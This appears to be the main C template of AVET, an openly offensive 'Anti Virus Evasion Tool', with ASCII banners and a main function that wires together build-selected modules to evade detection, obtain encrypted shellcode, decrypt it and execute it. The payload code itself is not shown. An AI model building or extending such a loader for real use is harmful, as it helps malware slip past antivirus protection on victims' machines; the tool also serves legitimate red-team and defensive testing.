/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
*/

//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"

//     " ________  ___      ___ _______  _________  \n" 
//     "|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
//     "\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
//     " \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
//     "  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
//     "   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
//     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
//         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"


// Include implementation files needed for the selected functions.
// The included files are assembled by the build script, in which functions are selected.
#include "evade/evade.include"
#include "get_shellcode/get_shellcode.include"
#include "get_key/get_key.include"
#include "decode_shellcode/decode_shellcode.include"
#include "bind_shellcode/bind_shellcode.include"


int main (int argc, char **argv)
{		
	// Function prototype pointers to store selected functions
	void (*evade) (char *arg1);
	unsigned char *(*get_shellcode) (char *arg1, int *shellcode_size);
	unsigned char *(*get_key) (char *arg1, int *key_length);
	void (*decode_shellcode) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext);
	void (*bind_shellcode) (unsigned char *shellcode);
	
	// Assign selected functions to prototypes
	// Included assignment code is assembled by the build script
	#include "evade/evade.assign"
	#include "get_shellcode/get_shellcode.assign"
	#include "get_key/get_key.assign"
	#include "decode_shellcode/decode_shellcode.assign"
	#include "bind_shellcode/bind_shellcode.assign"
	
	return 0;
}